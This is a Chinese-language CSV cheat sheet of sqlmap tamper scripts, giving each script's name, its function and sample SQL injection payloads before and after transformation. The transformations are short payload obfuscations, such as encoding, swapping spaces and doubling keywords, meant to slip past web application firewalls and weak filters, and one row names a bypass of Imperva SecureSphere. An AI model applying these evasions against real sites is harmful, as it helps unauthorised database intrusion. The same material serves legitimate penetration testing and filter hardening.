支持的数据库,编号,脚本名称,功能说明,实际应用例子,测试通过的数据库类型及其版本
ALL,1,"apostrophemask.py
","把 单引号' 替换为 utf8全宽度等价物 即 单引号' 替换为 %EF%BC%87","(""1 AND '1'='1"") 
'1 AND %EF%BC%871%EF%BC%87=%EF%BC%871'",
,2,base64encode.py,把 全部payload字符 替换为 它们经过base64编码后的字符  原文:Base64-encodes all characters in a given payload,"(""1' AND SLEEP(5)#"")
'MScgQU5EIFNMRUVQKDUpIw=='",
,3,multiplespaces.py,SQL关键字字符串的前后 添加多个空格 ,"('1 UNION SELECT foobar')
'1    UNION     SELECT   foobar'",
,4,space2plus.py,把 空格 替换为 + ,"('SELECT id FROM users')
'SELECT+id+FROM+users'
",
,5,"nonrecursivereplacement.py (已被删除 sqlmap 1.3.1.25中没有该脚本)","把 SQL关键字字符串 替换为 对应的两次重复字符串 （例如某网站只进行一次 将SQL关键字SELECT替换为空 而不是递归替换SQL关键字 所以这个网站可用该脚本进行注入） 该脚本适用于非常弱的自定义过滤器","('1 UNION SELECT 2--')
'1 UNIOUNIONN SELESELECTCT 2--'",
,6,space2randomblank.py,"代替空格字符（“”）从一个随机的空
白字符可选字符的有效集","('SELECT id FROM users')
'SELECT%0Did%0DFROM%0Ausers'",
,7,unionalltounion.py,替换UNION ALL SELECT UNION SELECT,"('-1 UNION ALL SELECT')
'-1 UNION SELECT'",
,8,"securesphere.py (已被删除 sqlmap 1.3.1.25中没有该脚本)","追加特制的字符串 以前可用来绕过Imperva SecureSphere WAF","('1 AND 1=1')
""1 AND 1=1 and '0having'='0having'""",
,,,,,
"MSSQL Microsoft SQL Server",1,space2dash.py,"把 空格 替换为 字符--跟一些随机字符串 再跟 \n 即 空格 替换为 —nVNaVoPYeva%0A","('1 AND 9227=9227')
'1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227'","* MSSQL * SQLite"
,2,"equaltolike.py
",把 = 替换为 LIKE,"('SELECT * FROM users WHERE id=1')
'SELECT * FROM users WHERE id LIKE 1’","* Microsoft SQL Server 2005 * MySQL 4, 5.0 and 5.5"
,3,space2mssqlblank.py,把 空格 替换为 有效的空白的符号（从中随机挑选一个）,"SELECT id FROM users
SELECT%08id%02FROM%0Fusers","* Microsoft SQL Server 2000
* Microsoft SQL Server 2005"
